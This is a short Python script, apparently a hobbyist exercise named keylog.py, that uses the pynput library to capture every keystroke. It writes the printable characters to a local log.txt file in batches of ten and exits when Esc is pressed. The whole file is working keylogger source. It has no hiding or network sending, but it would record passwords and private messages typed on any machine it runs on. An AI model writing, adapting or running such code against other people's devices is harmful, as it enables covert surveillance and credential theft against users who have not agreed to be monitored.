import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    #print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_to_logtxt(keys)
        keys = []

def write_to_logtxt(keys):
    filelog = open("log.txt", "a")
    for key in keys:
        k = str(key).replace("'","")
        if k.find("space") > 0:
            filelog.write('\n')
        elif k.find("key") == -1:
            filelog.write(k)
    filelog.close()

def exit_program(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = exit_program) as listener:
    listener.join()


"""
Testing keylog.py

"""
